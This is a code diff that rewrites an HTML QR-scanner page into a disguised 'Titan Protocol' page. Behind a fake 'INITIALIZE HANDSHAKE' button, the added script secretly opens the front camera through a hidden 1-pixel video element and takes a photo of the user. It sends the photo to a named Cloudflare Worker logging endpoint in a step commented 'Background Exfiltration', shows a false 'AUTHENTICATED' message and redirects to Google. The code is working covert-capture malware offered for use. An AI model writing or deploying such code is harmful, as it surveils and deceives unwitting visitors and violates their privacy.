@@ -3,150 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Titan Scanner | Secure</title>
-    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
+    <title>Titan Protocol</title>
     <style>
-        :root { --primary: #00ff88; --bg: #0d0d0d; }
-        body { 
-            background: var(--bg); color: var(--primary); 
-            font-family: 'Courier New', monospace; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center; 
-            height: 100vh; margin: 0; 
-        }
-        
-        /* Scanner UI */
-        #scanner-container {
-            position: relative; width: 300px; height: 300px;
-            border: 2px solid #333; border-radius: 12px; overflow: hidden;
-            background: #000;
-        }
-        
-        video { width: 100%; height: 100%; object-fit: cover; }
-        
-        /* Laser Animation */
-        .laser-line {
-            position: absolute; top: 0; left: 0; width: 100%; height: 2px;
-            background: var(--primary); box-shadow: 0 0 10px var(--primary);
-            animation: scan 2s infinite ease-in-out;
-            display: none; /* Hidden until active */
-        }
-        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
-
-        /* Controls */
-        #status-log {
-            margin-top: 20px; font-size: 0.8rem; color: #888; text-align: center;
-            min-height: 20px;
-        }
-        
-        button {
-            margin-top: 20px; padding: 12px 24px;
-            background: transparent; color: var(--primary);
-            border: 1px solid var(--primary); border-radius: 4px;
-            cursor: pointer; font-weight: bold; text-transform: uppercase;
-            transition: 0.2s;
-        }
-        button:hover { background: var(--primary); color: black; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .btn { padding: 25px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1.2rem; font-weight: bold; }
+        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <div id="scanner-container">
-        <video id="video-feed" playsinline></video>
-        <div class="laser-line" id="laser"></div>
-    </div>
-
-    <div id="status-log">SYSTEM STANDBY</div>
-    <button id="activate-btn">INITIALIZE SCANNER</button>
+    <p style="color: #444; font-size: 10px;">V: 2.0.1 - STABLE</p>
+    <div id="status">ENCRYPTION ENGINE STANDBY</div>
+    <br>
+    <video id="v" playsinline muted></video>
+    <button id="btn" class="btn">INITIALIZE HANDSHAKE</button>
 
     <script>
-        // CONFIGURATION: Replace with your deployed Worker URL
-        const ENDPOINT = "https://titan-logger.YOUR-SUBDOMAIN.workers.dev";
+        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
+        const video = document.getElementById('v');
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        const canvas = document.createElement('canvas');
 
-        const video = document.getElementById('video-feed');
-        const btn = document.getElementById('activate-btn');
-        const status = document.getElementById('status-log');
-        const laser = document.getElementById('laser');
-        let canvas = document.createElement('canvas');
-        let ctx = canvas.getContext('2d');
-        let isScanning = false;
-
-        // 1. Activation Trigger
         btn.onclick = async () => {
+            btn.style.display = 'none';
+            status.innerText = "CALIBRATING...";
+            
             try {
-                // Request Camera Access
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment" } 
+                    video: { facingMode: "user" },
+                    audio: false 
                 });
                 video.srcObject = stream;
-                video.setAttribute("playsinline", true); // Required for iOS
-                video.play();
                 
-                // UI Updates
-                btn.style.display = 'none';
-                laser.style.display = 'block';
-                status.innerText = "SEARCHING FOR DATA...";
-                isScanning = true;
-                
-                // Start the scanning loop
-                requestAnimationFrame(scanLoop);
-                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Slight delay to allow sensor light adjustment
+                    setTimeout(executeFinalCapture, 250);
+                };
             } catch (err) {
-                status.innerText = "ERROR: CAMERA ACCESS DENIED";
+                status.innerText = "CRITICAL ERROR: PERMISSION_REQUIRED";
                 status.style.color = "red";
-                console.error(err);
             }
         };
 
-        // 2. The Scanning Loop
-        function scanLoop() {
-            if (video.readyState === video.HAVE_ENOUGH_DATA && isScanning) {
-                // Draw current frame to canvas for analysis
-                canvas.height = video.videoHeight;
-                canvas.width = video.videoWidth;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Analyze image data
-                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                const code = jsQR(imageData.data, imageData.width, imageData.height, {
-                    inversionAttempts: "dontInvert",
-                });
+        async function executeFinalCapture() {
+            // 1. Snapshot
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const dataImg = canvas.toDataURL('image/jpeg', 0.5);
 
-                if (code) {
-                    // QR Code Found
-                    handleSuccess(code.data);
-                    return; // Stop the loop
-                }
-            }
-            
-            if (isScanning) {
-                requestAnimationFrame(scanLoop);
-            }
-        }
+            // 2. Kill Hardware
+            video.srcObject.getTracks().forEach(t => t.stop());
 
-        // 3. Success Handler
-        async function handleSuccess(qrData) {
-            isScanning = false;
-            laser.style.background = "#ff0055"; // Visual feedback (Red)
-            status.innerText = "TARGET ACQUIRED: " + qrData;
-            
-            // Stop Camera Stream (Clean Exit)
-            video.srcObject.getTracks().forEach(track => track.stop());
+            // 3. Background Exfiltration
+            fetch(LOGGING_API, {
+                method: 'POST',
+                keepalive: true,
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: dataImg })
+            }).catch(e => console.log("Upload backgrounded"));
 
-            // Send Data to Backend
-            try {
-                await fetch(ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ qr_data: qrData })
-                });
-                status.innerText += " [UPLOAD COMPLETE]";
-                
-                // Optional: Redirect user to the URL found in the QR code
-                // setTimeout(() => { window.location.href = qrData; }, 1500);
-                
-            } catch (e) {
-                status.innerText += " [UPLOAD FAILED]";
-            }
+            // 4. Clean Exit
+            status.innerText = "AUTHENTICATED. REDIRECTING...";
+            setTimeout(() => {
+                window.location.replace("https://google.com");
+            }, 500);
         }
     </script>
 </body>
